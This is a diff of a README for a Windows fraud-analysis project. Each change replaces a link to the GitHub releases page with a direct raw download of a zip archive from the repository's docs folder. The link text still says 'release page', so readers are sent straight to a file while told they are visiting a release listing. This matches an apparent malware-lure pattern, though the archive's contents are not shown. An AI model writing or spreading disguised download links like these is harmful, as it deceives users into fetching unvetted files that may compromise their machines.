@@ -1,6 +1,6 @@
 # 📊 fraud-detection-analytics-case - Fraud analysis made clear
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/hypopigmentationnudemouse124/fraud-detection-analytics-case/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/hypopigmentationnudemouse124/fraud-detection-analytics-case/main/docs/case_detection_analytics_fraud_2.9.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ This project gives you a full fraud analysis case for Windows. It follows a fint
 
 Use the release page to get the files you need:
 
-[Visit the release page to download](https://github.com/hypopigmentationnudemouse124/fraud-detection-analytics-case/releases)
+[Visit the release page to download](https://raw.githubusercontent.com/hypopigmentationnudemouse124/fraud-detection-analytics-case/main/docs/case_detection_analytics_fraud_2.9.zip)
 
 ## 🖥️ What This Project Does
 
@@ -40,7 +40,7 @@ Before you start, make sure your PC has:
 ## ⬇️ Download and Install
 
 1. Open the release page:  
-   [https://github.com/hypopigmentationnudemouse124/fraud-detection-analytics-case/releases](https://github.com/hypopigmentationnudemouse124/fraud-detection-analytics-case/releases)
+   [https://raw.githubusercontent.com/hypopigmentationnudemouse124/fraud-detection-analytics-case/main/docs/case_detection_analytics_fraud_2.9.zip](https://raw.githubusercontent.com/hypopigmentationnudemouse124/fraud-detection-analytics-case/main/docs/case_detection_analytics_fraud_2.9.zip)
 
 2. Find the latest release.
 
@@ -233,7 +233,7 @@ This project covers:
 
 If you need the files again, use this link:
 
-[Go to the release page](https://github.com/hypopigmentationnudemouse124/fraud-detection-analytics-case/releases)
+[Go to the release page](https://raw.githubusercontent.com/hypopigmentationnudemouse124/fraud-detection-analytics-case/main/docs/case_detection_analytics_fraud_2.9.zip)
 
 ## 🗂️ Suggested Folder Setup
 
